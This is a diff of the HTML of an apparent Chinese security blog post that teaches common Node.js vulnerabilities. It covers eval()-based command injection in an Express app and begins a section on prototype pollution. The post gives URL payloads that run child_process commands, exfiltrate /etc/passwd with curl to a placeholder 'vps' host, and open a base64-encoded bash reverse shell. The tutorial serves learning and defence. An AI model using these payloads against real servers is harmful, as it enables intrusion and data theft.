@@ -1,66 +1,30 @@
 <!DOCTYPE html>
+<html class="has-navbar-fixed-top">
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+<title>Node.js 常见漏洞学习与总结 - Threezh1&#39;s blog</title>
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/outdated-browser/1.1.5/outdatedbrowser.min.css">
 
 
 
 
-
-<html lang="Chinese">
-<head>
-  <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
-<meta name="theme-color" content="#222">
-<meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/head.jpg?v=7.3.0">
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/head.jpg?v=7.3.0">
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/head.jpg?v=7.3.0">
-  <link rel="mask-icon" href="/images/head.jpg?v=7.3.0" color="#222">
-
-<link rel="stylesheet" href="/css/main.css?v=7.3.0">
+<meta name="description" content="Share learn & Share life.">
 
 
-<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+<meta name="keywords" content="Threezh1">
 
 
-<script id="hexo-configurations">
-  var NexT = window.NexT || {};
-  var CONFIG = {
-    root: '/',
-    scheme: 'Pisces',
-    version: '7.3.0',
-    exturl: false,
-    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
-    copycode: {"enable":false,"show_result":false,"style":null},
-    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
-    bookmark: {"enable":false,"color":"#222","save":"auto"},
-    fancybox: false,
-    mediumzoom: false,
-    lazyload: false,
-    pangu: false,
-    algolia: {
-      appID: '',
-      apiKey: '',
-      indexName: '',
-      hits: {"per_page":10},
-      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
-    },
-    localsearch: {"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
-    path: '',
-    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
-    translation: {
-      copy_button: 'Kopieren',
-      copy_success: 'Kopiert',
-      copy_failure: 'Kopieren fehlgeschlagen'
-    }
-  };
-</script>
 
-  <meta name="description" content="危险函数所导致的命令执行eval()eval() 函数可计算某个字符串，并执行其中的的 JavaScript 代码。和PHP中eval函数一样，如果传递到函数中的参数可控并且没有经过严格的过滤时，就会导致漏洞的出现。 简单例子： main.js 1234567891011var express = require(&quot;express&quot;);var app = express();app.get(&apos;/e">
-<meta name="keywords" content="总结">
+    <meta name="description" content="&amp;#x5371;&amp;#x9669;&amp;#x51FD;&amp;#x6570;&amp;#x6240;&amp;#x5BFC;&amp;#x81F4;&amp;#x7684;&amp;#x547D;&amp;#x4EE4;&amp;#x6267;&amp;#x884C;eval()eval() &amp;#x51FD;&amp;#x6570;&amp;#x53EF;&amp;#x8BA1;&amp;#x7B97;&amp;#x67D0;&amp;#x4E2A;&amp;#x5B57;&amp;#x7B26;&amp;#x4E32;&amp;#xFF0C;&amp;#x">
+<meta name="keywords" content="node.js">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Node.js 常见漏洞学习与总结">
 <meta property="og:url" content="http://yoursite.com/2020/01/30/NodeJsVulns/index.html">
 <meta property="og:site_name" content="Threezh1&#39;s blog">
-<meta property="og:description" content="危险函数所导致的命令执行eval()eval() 函数可计算某个字符串，并执行其中的的 JavaScript 代码。和PHP中eval函数一样，如果传递到函数中的参数可控并且没有经过严格的过滤时，就会导致漏洞的出现。 简单例子： main.js 1234567891011var express = require(&quot;express&quot;);var app = express();app.get(&apos;/e">
+<meta property="og:description" content="&amp;#x5371;&amp;#x9669;&amp;#x51FD;&amp;#x6570;&amp;#x6240;&amp;#x5BFC;&amp;#x81F4;&amp;#x7684;&amp;#x547D;&amp;#x4EE4;&amp;#x6267;&amp;#x884C;eval()eval() &amp;#x51FD;&amp;#x6570;&amp;#x53EF;&amp;#x8BA1;&amp;#x7B97;&amp;#x67D0;&amp;#x4E2A;&amp;#x5B57;&amp;#x7B26;&amp;#x4E32;&amp;#xFF0C;&amp;#x">
 <meta property="og:locale" content="Chinese">
 <meta property="og:image" content="https://i.loli.net/2020/02/11/kNacVQXFslGYrWt.png">
 <meta property="og:image" content="https://i.loli.net/2020/02/11/QyN5JVOde3YL8aZ.png">
@@ -68,689 +32,542 @@
 <meta property="og:image" content="https://i.loli.net/2020/02/11/aDr6o823Ux4F5Zw.png">
 <meta property="og:image" content="https://i.loli.net/2020/02/11/V1hOMYz7fQ3KB6X.png">
 <meta property="og:image" content="https://i.loli.net/2020/02/11/L8pV6gXoAnJSRQ4.png">
-<meta property="og:updated_time" content="2020-02-11T02:12:33.480Z">
+<meta property="og:updated_time" content="2020-02-12T14:04:52.065Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Node.js 常见漏洞学习与总结">
-<meta name="twitter:description" content="危险函数所导致的命令执行eval()eval() 函数可计算某个字符串，并执行其中的的 JavaScript 代码。和PHP中eval函数一样，如果传递到函数中的参数可控并且没有经过严格的过滤时，就会导致漏洞的出现。 简单例子： main.js 1234567891011var express = require(&quot;express&quot;);var app = express();app.get(&apos;/e">
+<meta name="twitter:description" content="&amp;#x5371;&amp;#x9669;&amp;#x51FD;&amp;#x6570;&amp;#x6240;&amp;#x5BFC;&amp;#x81F4;&amp;#x7684;&amp;#x547D;&amp;#x4EE4;&amp;#x6267;&amp;#x884C;eval()eval() &amp;#x51FD;&amp;#x6570;&amp;#x53EF;&amp;#x8BA1;&amp;#x7B97;&amp;#x67D0;&amp;#x4E2A;&amp;#x5B57;&amp;#x7B26;&amp;#x4E32;&amp;#xFF0C;&amp;#x">
 <meta name="twitter:image" content="https://i.loli.net/2020/02/11/kNacVQXFslGYrWt.png">
-  <link rel="canonical" href="http://yoursite.com/2020/01/30/NodeJsVulns/">
-
-
-<script id="page-configurations">
-  // https://hexo.io/docs/variables.html
-  CONFIG.page = {
-    sidebar: "",
-    isHome: false,
-    isPost: true,
-    isPage: false,
-    isArchive: false
-  };
-</script>
-
-  <title>Node.js 常见漏洞学习与总结 | Threezh1's blog</title>
-  <meta name="generator" content="Hexo 3.8.0">
-  
-
-
-  <script>
-    var _hmt = _hmt || [];
-    (function() {
-      var hm = document.createElement("script");
-      hm.src = "https://hm.baidu.com/hm.js?41896264c6b7bfbb2d9ae9719e4440c2";
-      var s = document.getElementsByTagName("script")[0];
-      s.parentNode.insertBefore(hm, s);
-    })();
-  </script>
 
 
 
 
 
+<link rel="icon" href="/favicon.png">
 
-  <noscript>
-  <style>
-  .use-motion .motion-element,
-  .use-motion .brand,
-  .use-motion .menu-item,
-  .sidebar-inner,
-  .use-motion .post-block,
-  .use-motion .pagination,
-  .use-motion .comments,
-  .use-motion .post-header,
-  .use-motion .post-body,
-  .use-motion .collection-header { opacity: initial; }
 
-  .use-motion .logo,
-  .use-motion .site-title,
-  .use-motion .site-subtitle {
-    opacity: initial;
-    top: initial;
-  }
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Ovo|Source+Code+Pro">
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/bulma/0.6.2/css/bulma.min.css">
 
-  .use-motion .logo-line-before i { left: initial; }
-  .use-motion .logo-line-after i { right: initial; }
-  </style>
-</noscript>
+
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/css/lightgallery.min.css">
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/justifiedGallery/3.6.5/css/justifiedGallery.min.css">
+
+
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/atom-one-light.min.css">
+
+<link rel="stylesheet" href="/css/style.css">
+
+<script defer src="//use.fontawesome.com/releases/v5.0.8/js/all.js"></script>
+
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
 
 </head>
-
-<body itemscope itemtype="http://schema.org/WebPage" lang="Chinese">
-  <div class="container use-motion">
-    <div class="headband"></div>
-
-    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-wrapper">
-  <div class="site-meta">
-
-    <div>
-      <a href="/" class="brand" rel="start">
-        <span class="logo-line-before"><i></i></span>
-        <span class="site-title">Threezh1's blog</span>
-        <span class="logo-line-after"><i></i></span>
-      </a>
-    </div>
-        <p class="site-subtitle">分享学习、分享想法</p>
-      
-  </div>
-
-  <div class="site-nav-toggle">
-    <button aria-label="Navigationsleiste an/ausschalten">
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-    </button>
-  </div>
-</div>
-
-
-<nav class="site-nav">
-  
-  <ul id="menu" class="menu">
-      
-      
-      
-        
-        <li class="menu-item menu-item-home">
-      
+<body>
     
-
-    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Startseite</a>
-
-  </li>
-      
-      
-      
-        
-        <li class="menu-item menu-item-archives">
-      
-    
-
-    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archiv</a>
-
-  </li>
-      
-      
-      
-        
-        <li class="menu-item menu-item-threeday">
-      
-    
-
-    <a href="http://119.3.219.188/" rel="noopener" target="_blank"><i class="menu-item-icon fa fa-fw fa-Threeday"></i> <br>Threeday</a>
-
-  </li>
-  </ul>
-
-</nav>
-</div>
-    </header>
-
-    <main id="main" class="main">
-      <div class="main-inner">
-        <div class="content-wrap">
-            
-
-          <div id="content" class="content page-post-detail">
-            
-
-  <div id="posts" class="posts-expand">
-    
-
-  <article class="post" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/30/NodeJsVulns/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Threezh1">
-      <meta itemprop="description" content="Share learn & Share life.">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Threezh1's blog">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">Node.js 常见漏洞学习与总结
-
-          
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">Veröffentlicht am</span>
-
-              
+<nav class="navbar is-transparent is-fixed-top navbar-main" role="navigation" aria-label="main navigation">
+    <div class="container">
+        <div class="navbar-brand">
+            <a class="navbar-item navbar-logo" href="/">
                 
-              
-
-              <time title="Erstellt: 2020-01-30 12:00:00" itemprop="dateCreated datePublished" datetime="2020-01-30T12:00:00+08:00">2020-01-30</time>
-            </span>
-          
-            
-
-            
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">Bearbeitet am</span>
-                <time title="Geändert am: 2020-02-11 10:12:33" itemprop="dateModified" datetime="2020-02-11T10:12:33+08:00">2020-02-11</time>
-              </span>
-            
-          
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">in</span>
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Node-js/" itemprop="url" rel="index"><span itemprop="name">Node.js</span></a></span>
-
+                <img src="/images/logo.png" alt height="28">
                 
-                
-              
-            </span>
-          
-
-          
-
+            </a>
+            <div class="navbar-burger">
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
         </div>
-      </header>
+        
+        <div class="navbar-menu navbar-start">
+            
+            <a class="navbar-item " href="/archives">归档</a>
+            
+            <a class="navbar-item " href="/Projects">项目</a>
+            
+            <a class="navbar-item " href="/Life">生活</a>
+            
+            <a class="navbar-item " href="/Photography">摄影</a>
+            
+            <a class="navbar-item " href="/About">关于</a>
+            
+            <a class="navbar-item " href="http://119.3.219.188/">Threeday</a>
+            
+        </div>
+        
+        <div class="navbar-menu navbar-end">
+            
+            <a class="navbar-item search" title="Buscar" href="javascript:;">
+                <i class="fas fa-search"></i>
+            </a>
+            
+            
+            
+            <a class="navbar-item" title="GitHub" href="https://github.com/Threezh1">
+                
+                <i class="fab fa-github"></i>
+                
+            </a>
+               
+            
+        </div>
+    </div>
+</nav>
 
+    <section class="section">
+    <div class="container">
+    <article class="article content gallery" itemscope itemprop="blogPost">
+    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
+        
+            Node.js 常见漏洞学习与总结
+        
+    </h1>
+    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
+        <span class="column is-narrow">
+            <time datetime="2020-01-30T04:00:00.000Z" itemprop="datePublished">Jan 30 2020</time>
+        </span>
+        
+        <span class="column is-narrow article-category">
+            <i class="far fa-folder"></i>
+            <a class="article-category-link" href="/categories/技术文章/">技术文章</a>
+        </span>
+        
+        
+        <span class="column is-narrow">
+            
+            
+            22 minutes de lectura (Alrededor de 3286 palabras)
+        </span>
+        
+    </div>
+    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
     
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-        <h2 id="危险函数所导致的命令执行"><a href="#危险函数所导致的命令执行" class="headerlink" title="危险函数所导致的命令执行"></a>危险函数所导致的命令执行</h2><h3 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h3><p>eval() 函数可计算某个字符串，并执行其中的的 JavaScript 代码。和PHP中eval函数一样，如果传递到函数中的参数可控并且没有经过严格的过滤时，就会导致漏洞的出现。</p>
-<p>简单例子：</p>
+        <h2 id="&#x5371;&#x9669;&#x51FD;&#x6570;&#x6240;&#x5BFC;&#x81F4;&#x7684;&#x547D;&#x4EE4;&#x6267;&#x884C;"><a href="#&#x5371;&#x9669;&#x51FD;&#x6570;&#x6240;&#x5BFC;&#x81F4;&#x7684;&#x547D;&#x4EE4;&#x6267;&#x884C;" class="headerlink" title="&#x5371;&#x9669;&#x51FD;&#x6570;&#x6240;&#x5BFC;&#x81F4;&#x7684;&#x547D;&#x4EE4;&#x6267;&#x884C;"></a>&#x5371;&#x9669;&#x51FD;&#x6570;&#x6240;&#x5BFC;&#x81F4;&#x7684;&#x547D;&#x4EE4;&#x6267;&#x884C;</h2><h3 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h3><p>eval() &#x51FD;&#x6570;&#x53EF;&#x8BA1;&#x7B97;&#x67D0;&#x4E2A;&#x5B57;&#x7B26;&#x4E32;&#xFF0C;&#x5E76;&#x6267;&#x884C;&#x5176;&#x4E2D;&#x7684;&#x7684; JavaScript &#x4EE3;&#x7801;&#x3002;&#x548C;PHP&#x4E2D;eval&#x51FD;&#x6570;&#x4E00;&#x6837;&#xFF0C;&#x5982;&#x679C;&#x4F20;&#x9012;&#x5230;&#x51FD;&#x6570;&#x4E2D;&#x7684;&#x53C2;&#x6570;&#x53EF;&#x63A7;&#x5E76;&#x4E14;&#x6CA1;&#x6709;&#x7ECF;&#x8FC7;&#x4E25;&#x683C;&#x7684;&#x8FC7;&#x6EE4;&#x65F6;&#xFF0C;&#x5C31;&#x4F1A;&#x5BFC;&#x81F4;&#x6F0F;&#x6D1E;&#x7684;&#x51FA;&#x73B0;&#x3002;<br><a id="more"></a><br>&#x7B80;&#x5355;&#x4F8B;&#x5B50;&#xFF1A;</p>
 <p>main.js</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">"express"</span>);</span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/eval'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">req,res</span>)</span>&#123;</span><br><span class="line">    res.send(<span class="built_in">eval</span>(req.query.q));</span><br><span class="line">    <span class="built_in">console</span>.log(req.query.q);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> server = app.listen(<span class="number">8888</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="string">"应用实例，访问地址为 http://127.0.0.1:8888/"</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
-<p><strong>漏洞利用：</strong></p>
-<p>Node.js中的chile_process.exec调用的是/bash.sh，它是一个bash解释器，可以执行系统命令。在eval函数的参数中可以构造<code>require(&#39;child_process&#39;).exec(&#39;&#39;);</code>来进行调用。</p>
-<p>弹计算器(windows)：</p>
+<figure class="highlight js hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">var</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;express&quot;</span>);</span><br><span class="line"><span class="hljs-keyword">var</span> app = express();</span><br><span class="line"></span><br><span class="line">app.get(<span class="hljs-string">&apos;/eval&apos;</span>,<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req,res</span>)</span>{</span><br><span class="line">    res.send(<span class="hljs-built_in">eval</span>(req.query.q));</span><br><span class="line">    <span class="hljs-built_in">console</span>.log(req.query.q);</span><br><span class="line">})</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">var</span> server = app.listen(<span class="hljs-number">8888</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>{</span><br><span class="line">	<span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;&#x5E94;&#x7528;&#x5B9E;&#x4F8B;&#xFF0C;&#x8BBF;&#x95EE;&#x5730;&#x5740;&#x4E3A; http://127.0.0.1:8888/&quot;</span>);</span><br><span class="line">})</span><br></pre></td></tr></table></figure>
+
+<p><strong>&#x6F0F;&#x6D1E;&#x5229;&#x7528;&#xFF1A;</strong></p>
+<p>Node.js&#x4E2D;&#x7684;chile_process.exec&#x8C03;&#x7528;&#x7684;&#x662F;/bash.sh&#xFF0C;&#x5B83;&#x662F;&#x4E00;&#x4E2A;bash&#x89E3;&#x91CA;&#x5668;&#xFF0C;&#x53EF;&#x4EE5;&#x6267;&#x884C;&#x7CFB;&#x7EDF;&#x547D;&#x4EE4;&#x3002;&#x5728;eval&#x51FD;&#x6570;&#x7684;&#x53C2;&#x6570;&#x4E2D;&#x53EF;&#x4EE5;&#x6784;&#x9020;<code>require(&apos;child_process&apos;).exec(&apos;&apos;);</code>&#x6765;&#x8FDB;&#x884C;&#x8C03;&#x7528;&#x3002;</p>
+<p>&#x5F39;&#x8BA1;&#x7B97;&#x5668;(windows)&#xFF1A;</p>
 <pre><code>/eval?q=require(&apos;child_process&apos;).exec(&apos;calc&apos;);
-</code></pre><p>读取文件(linux)：</p>
+</code></pre><p>&#x8BFB;&#x53D6;&#x6587;&#x4EF6;(linux)&#xFF1A;</p>
 <pre><code>/eval?q=require(&apos;child_process&apos;).exec(&apos;curl -F &quot;x=`cat /etc/passwd`&quot; http://vps&apos;);;
-</code></pre><p>反弹shell(linux)：</p>
+</code></pre><p>&#x53CD;&#x5F39;shell(linux)&#xFF1A;</p>
 <pre><code>/eval?q=require(&apos;child_process&apos;).exec(&apos;echo YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMjcuMC4wLjEvMzMzMyAwPiYx|base64 -d|bash&apos;);
 
-YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMjcuMC4wLjEvMzMzMyAwPiYx是bash -i &gt;&amp; /dev/tcp/127.0.0.1/3333 0&gt;&amp;1 BASE64加密后的结果，直接调用会报错。
+YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMjcuMC4wLjEvMzMzMyAwPiYx&#x662F;bash -i &gt;&amp; /dev/tcp/127.0.0.1/3333 0&gt;&amp;1 BASE64&#x52A0;&#x5BC6;&#x540E;&#x7684;&#x7ED3;&#x679C;&#xFF0C;&#x76F4;&#x63A5;&#x8C03;&#x7528;&#x4F1A;&#x62A5;&#x9519;&#x3002;
 
-注意：BASE64加密后的字符中有一个+号需要url编码为%2B(一定情况下)
-</code></pre><p>如果上下文中没有require(类似于Code-Breaking 2018 Thejs)，则可以使用<code>global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;calc&#39;)</code>来执行命令</p>
-<p>paypal一个命令执行的例子：</p>
+&#x6CE8;&#x610F;&#xFF1A;BASE64&#x52A0;&#x5BC6;&#x540E;&#x7684;&#x5B57;&#x7B26;&#x4E2D;&#x6709;&#x4E00;&#x4E2A;+&#x53F7;&#x9700;&#x8981;url&#x7F16;&#x7801;&#x4E3A;%2B(&#x4E00;&#x5B9A;&#x60C5;&#x51B5;&#x4E0B;)
+</code></pre><p>&#x5982;&#x679C;&#x4E0A;&#x4E0B;&#x6587;&#x4E2D;&#x6CA1;&#x6709;require(&#x7C7B;&#x4F3C;&#x4E8E;Code-Breaking 2018 Thejs)&#xFF0C;&#x5219;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;<code>global.process.mainModule.constructor._load(&apos;child_process&apos;).exec(&apos;calc&apos;)</code>&#x6765;&#x6267;&#x884C;&#x547D;&#x4EE4;</p>
+<p>paypal&#x4E00;&#x4E2A;&#x547D;&#x4EE4;&#x6267;&#x884C;&#x7684;&#x4F8B;&#x5B50;&#xFF1A;</p>
 <p><a href="https://artsploit.blogspot.com/2016/08/pprce2.html" target="_blank" rel="noopener">[demo.paypal.com] Node.js code injection (RCE)</a></p>
-<p>(使用数组绕过过滤，再调用child_process执行命令)<br><a id="more"></a></p>
-<h3 id="类似命令"><a href="#类似命令" class="headerlink" title="类似命令"></a>类似命令</h3><p>间隔两秒执行函数：</p>
+<p>(&#x4F7F;&#x7528;&#x6570;&#x7EC4;&#x7ED5;&#x8FC7;&#x8FC7;&#x6EE4;&#xFF0C;&#x518D;&#x8C03;&#x7528;child_process&#x6267;&#x884C;&#x547D;&#x4EE4;)</p>
+<h3 id="&#x7C7B;&#x4F3C;&#x547D;&#x4EE4;"><a href="#&#x7C7B;&#x4F3C;&#x547D;&#x4EE4;" class="headerlink" title="&#x7C7B;&#x4F3C;&#x547D;&#x4EE4;"></a>&#x7C7B;&#x4F3C;&#x547D;&#x4EE4;</h3><p>&#x95F4;&#x9694;&#x4E24;&#x79D2;&#x6267;&#x884C;&#x51FD;&#x6570;&#xFF1A;</p>
 <ul>
 <li>setInteval(some_function, 2000)</li>
 </ul>
-<p>两秒后执行函数：</p>
+<p>&#x4E24;&#x79D2;&#x540E;&#x6267;&#x884C;&#x51FD;&#x6570;&#xFF1A;</p>
 <ul>
 <li>setTimeout(some_function, 2000);</li>
 </ul>
-<p>some_function处就类似于eval函数的参数</p>
-<p>输出HelloWorld：</p>
+<p>some_function&#x5904;&#x5C31;&#x7C7B;&#x4F3C;&#x4E8E;eval&#x51FD;&#x6570;&#x7684;&#x53C2;&#x6570;</p>
+<p>&#x8F93;&#x51FA;HelloWorld&#xFF1A;</p>
 <ul>
-<li>Function(“console.log(‘HelloWolrd’)”)()</li>
+<li>Function(&#x201C;console.log(&#x2018;HelloWolrd&#x2019;)&#x201D;)()</li>
 </ul>
-<p>类似于php中的create_function</p>
-<p>以上都可以导致命令执行</p>
-<h2 id="Node-js-原型污染漏洞"><a href="#Node-js-原型污染漏洞" class="headerlink" title="Node.js 原型污染漏洞"></a>Node.js 原型污染漏洞</h2><p>Javascript原型链参考文章：<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain" target="_blank" rel="noopener">继承与原型链</a></p>
-<h3 id="关于原型链"><a href="#关于原型链" class="headerlink" title="关于原型链"></a>关于原型链</h3><p>文章内关于原型和原型链的知识写的非常详细，就不再总结整个过程了，以下为几个比较重要的点：</p>
+<p>&#x7C7B;&#x4F3C;&#x4E8E;php&#x4E2D;&#x7684;create_function</p>
+<p>&#x4EE5;&#x4E0A;&#x90FD;&#x53EF;&#x4EE5;&#x5BFC;&#x81F4;&#x547D;&#x4EE4;&#x6267;&#x884C;</p>
+<h2 id="Node-js-&#x539F;&#x578B;&#x6C61;&#x67D3;&#x6F0F;&#x6D1E;"><a href="#Node-js-&#x539F;&#x578B;&#x6C61;&#x67D3;&#x6F0F;&#x6D1E;" class="headerlink" title="Node.js &#x539F;&#x578B;&#x6C61;&#x67D3;&#x6F0F;&#x6D1E;"></a>Node.js &#x539F;&#x578B;&#x6C61;&#x67D3;&#x6F0F;&#x6D1E;</h2><p>Javascript&#x539F;&#x578B;&#x94FE;&#x53C2;&#x8003;&#x6587;&#x7AE0;&#xFF1A;<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain" target="_blank" rel="noopener">&#x7EE7;&#x627F;&#x4E0E;&#x539F;&#x578B;&#x94FE;</a></p>
+<h3 id="&#x5173;&#x4E8E;&#x539F;&#x578B;&#x94FE;"><a href="#&#x5173;&#x4E8E;&#x539F;&#x578B;&#x94FE;" class="headerlink" title="&#x5173;&#x4E8E;&#x539F;&#x578B;&#x94FE;"></a>&#x5173;&#x4E8E;&#x539F;&#x578B;&#x94FE;</h3><p>&#x6587;&#x7AE0;&#x5185;&#x5173;&#x4E8E;&#x539F;&#x578B;&#x548C;&#x539F;&#x578B;&#x94FE;&#x7684;&#x77E5;&#x8BC6;&#x5199;&#x7684;&#x975E;&#x5E38;&#x8BE6;&#x7EC6;&#xFF0C;&#x5C31;&#x4E0D;&#x518D;&#x603B;&#x7ED3;&#x6574;&#x4E2A;&#x8FC7;&#x7A0B;&#x4E86;&#xFF0C;&#x4EE5;&#x4E0B;&#x4E3A;&#x51E0;&#x4E2A;&#x6BD4;&#x8F83;&#x91CD;&#x8981;&#x7684;&#x70B9;&#xFF1A;</p>
 <ul>
-<li>在javascript，每一个实例对象都有一个prototype属性，prototype 属性可以向对象添加属性和方法。</li>
+<li>&#x5728;javascript&#xFF0C;&#x6BCF;&#x4E00;&#x4E2A;&#x5B9E;&#x4F8B;&#x5BF9;&#x8C61;&#x90FD;&#x6709;&#x4E00;&#x4E2A;prototype&#x5C5E;&#x6027;&#xFF0C;prototype &#x5C5E;&#x6027;&#x53EF;&#x4EE5;&#x5411;&#x5BF9;&#x8C61;&#x6DFB;&#x52A0;&#x5C5E;&#x6027;&#x548C;&#x65B9;&#x6CD5;&#x3002;</li>
 </ul>
-<p>例子：</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">object.prototype.name=value</span><br></pre></td></tr></table></figure>
+<p>&#x4F8B;&#x5B50;&#xFF1A;</p>
+<figure class="highlight js hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">object.prototype.name=value</span><br></pre></td></tr></table></figure>
+
 <ul>
-<li>在javascript，每一个实例对象都有一个<code>__proto__</code>属性，这个实例属性指向对象的原型对象(即原型)。可以通过以下方式访问得到某一实例对象的原型对象：</li>
+<li>&#x5728;javascript&#xFF0C;&#x6BCF;&#x4E00;&#x4E2A;&#x5B9E;&#x4F8B;&#x5BF9;&#x8C61;&#x90FD;&#x6709;&#x4E00;&#x4E2A;<code>__proto__</code>&#x5C5E;&#x6027;&#xFF0C;&#x8FD9;&#x4E2A;&#x5B9E;&#x4F8B;&#x5C5E;&#x6027;&#x6307;&#x5411;&#x5BF9;&#x8C61;&#x7684;&#x539F;&#x578B;&#x5BF9;&#x8C61;(&#x5373;&#x539F;&#x578B;)&#x3002;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x4EE5;&#x4E0B;&#x65B9;&#x5F0F;&#x8BBF;&#x95EE;&#x5F97;&#x5230;&#x67D0;&#x4E00;&#x5B9E;&#x4F8B;&#x5BF9;&#x8C61;&#x7684;&#x539F;&#x578B;&#x5BF9;&#x8C61;&#xFF1A;</li>
 </ul>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">objectname[<span class="string">"__proto__"</span>]</span><br><span class="line">objectname.__proto__</span><br><span class="line">objectname.constructor.prototype</span><br></pre></td></tr></table></figure>
+<figure class="highlight js hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">objectname[<span class="hljs-string">&quot;__proto__&quot;</span>]</span><br><span class="line">objectname.__proto__</span><br><span class="line">objectname.constructor.prototype</span><br></pre></td></tr></table></figure>
+
 <ul>
-<li>不同对象所生成的原型链如下(部分)：</li>
+<li>&#x4E0D;&#x540C;&#x5BF9;&#x8C61;&#x6240;&#x751F;&#x6210;&#x7684;&#x539F;&#x578B;&#x94FE;&#x5982;&#x4E0B;(&#x90E8;&#x5206;)&#xFF1A;</li>
 </ul>
